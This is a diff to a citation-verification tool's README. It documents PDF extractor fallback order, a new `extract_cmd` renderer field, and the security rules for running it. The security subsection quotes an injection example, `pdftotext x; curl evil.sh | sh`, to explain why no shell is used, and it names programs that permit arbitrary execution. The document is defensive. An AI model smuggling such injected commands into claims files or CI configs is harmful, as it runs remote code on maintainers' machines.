@@ -70,32 +70,38 @@ the same signal as a passage that was never there.
 
 ## Reading PDFs
 
-Every result records which reader produced the text it was checked against, because a pin
-establishes that the file has not changed and establishes nothing about the extraction.
+Every result records which extractor produced the text it was checked against, because a pin
+establishes that the file has not changed and establishes nothing about the reading of it.
 
-| Reader | Engine | Install |
-|--------|--------|---------|
-| poppler | `pdftotext -layout`, run as a subprocess | `brew install poppler` · `apt install poppler-utils` |
-| pdfplumber | pdfminer.six plus its own layout layer | `pip install "citations[pdfplumber]"` |
+| Extractor | Engine | Install |
+|-----------|--------|---------|
+| `pdftotext -layout` | poppler, run as a subprocess | `brew install poppler` · `apt install poppler-utils` |
 | pypdf | its own content-stream parser | `pip install "citations[pypdf]"` |
+| pdfplumber | pdfminer.six plus its own layout layer | `pip install "citations[pdfplumber]"` |
 
-Poppler is preferred and recommended: `-layout` reproduces column geometry, and the
-pure-Python readers drop inter-word spaces often enough that a passage resolves only after
-whitespace-insensitive matching. Where it is absent, or fails on a document, the chain falls
-through to whichever reader is installed and records the substitution as a fallback — so
-`pip install citations` alone is enough to check a PDF, and no result is quietly attributed to
-a reader that did not produce it.
+Poppler is preferred and recommended. Where it is absent, or fails on a document, the chain
+falls through to whichever pure-Python reader is installed and records the substitution as a
+fallback — so `pip install citations` alone is enough to check a PDF, and no result is quietly
+attributed to an extractor that did not produce it. pypdf comes before pdfplumber because it
+agreed with poppler on more of a 1,792-check corpus and read a document in a third of the
+time; the measurement is in `research/pdf-readers/`.
+
+A source that declares `extract_cmd` does not enter that chain. Its author has named the
+program that produces the text they quote, so it runs or the check is `unchecked` with its
+reason — falling through would run a PDF reader over a source the author just said is not a
+PDF, and record an extractor nobody asked for.
 
 ```bash
 citations verify --claims claims/ --triangulate
 ```
 
 `--triangulate` asks every installed reader instead of one. Where they disagree the result is
-`indeterminate`, never `not found`: two readers disagreeing says the document is not
+`indeterminate`, never `not found`: two extractors disagreeing says the document is not
 determinate under the readers on this machine, which accuses nothing, while `not found`
 asserts the manuscript quoted a passage its source does not contain. Triangulation is opt-in
-because it costs one extraction per reader, and a run with only one reader installed reports
-that no agreement was established rather than that the readers concurred.
+because it costs one extraction per reader; it does not apply to a source that declares a
+command, and a run that triangulated nothing says so rather than reporting the readers as
+having concurred.
 
 ## Audit output
 
@@ -155,7 +161,7 @@ source:
   citation: schiffman2026             # the bibkey
   local: reference/schiffman2026.pdf  # what gets read
   sha256: 3f9a…                       # which bytes were read
-  extract_cmd: pdftotext
+  extract_cmd: pdftotext -layout {} - # what turned the bytes into text
 
 claims:
   orthogonal-cores:
@@ -167,6 +173,72 @@ claims:
 
 `statement` is yours; `exact` is theirs. The tool checks the second only, so a `statement` that
 overreaches its quote is for review to catch — the command cannot.
+
+## Declaring the extractor
+
+A PDF goes through `pdftotext -layout`; `.txt`, `.md`, `.tei`, `.xml`, `.html`, `.htm` and
+`.rst` are read straight off disk. Anything else — a `.tex` manuscript, a two-column PDF whose
+columns `-layout` splices together — needs a renderer the claims file names:
+
+```yaml
+source:
+  local: paper/manuscript.tex
+  sha256: 8c41…
+  extract_cmd: detex
+```
+
+The source path replaces `{}`, or is appended when the command has no `{}`, and the command
+prints the text to stdout. That text is what the quotations resolve against, and `verify` names
+the command that produced it:
+
+```text
+1 quotes
+
+  found             1
+  not found         0
+
+read by
+        1  detex
+```
+
+Which renderer is not a detail. `detex` leaves `\REVIEW{check this against Table 2}` welded
+onto the word before it, so a quotation ending at that word comes back `found` with a
+`truncated` warning; `pandoc -f latex -t plain` drops the annotation and the same quotation
+comes back clean. A pin says the bytes did not change and says nothing about how they were
+read, so the report names the extractor and records a digest of what it produced.
+
+The package ships no LaTeX support, because a renderer has to settle three things a package
+cannot settle for every manuscript. The renderer this project uses on its own manuscript drops
+the argument of an annotation macro (`\REVIEW{...}` sitting between two words of a sentence),
+keeps the argument of every other control word (`\textbf{145 are checkable}` is the number the
+claim is about), and puts a separator wherever markup was removed, so a quotation cannot
+silently span two table cells. Those three rules are right for that manuscript and wrong for
+one that writes prose inside `\REVIEW`, which is why the field names a renderer rather than
+the package guessing at one.
+
+### What is allowed to run
+
+`extract_cmd` runs a program on the machine doing the checking. The case that decides the rules
+is not an author running their own claims file: it is `citations verify` in CI on a pull request
+from a fork, where the contributor wrote the claims file and the command executes on the
+maintainer's runner with the runner's environment in reach.
+
+- **No shell.** The declared string is split into a program and arguments and executed
+  directly. `pdftotext x; curl evil.sh | sh` is not filtered out — it cannot be expressed. The
+  `;` and the `|` arrive at `pdftotext` as arguments and it fails.
+- **An allowlist.** `pdftotext` and `detex` run unasked. Anything else needs
+  `citations verify --allow-extractor NAME`, written by whoever runs the check rather than by
+  whoever wrote the claims file. The program is matched as written, so `pdftotext` is allowed
+  and `./pdftotext` is not.
+
+A refused command is `unchecked` and says it was refused; a command that is not installed is
+`unchecked` and says that instead. The remedy for one is consent and for the other an install,
+and neither makes the passage absent.
+
+The allowlist bounds which program runs, not what an allowed program can be told to do, so a
+program that loads and runs code named on its own command line stays out of the default set.
+`pandoc --lua-filter` and `mutool run` are both arbitrary execution; reaching either is a
+deliberate act with the consequence in view.
 
 ## Records are YAML
 
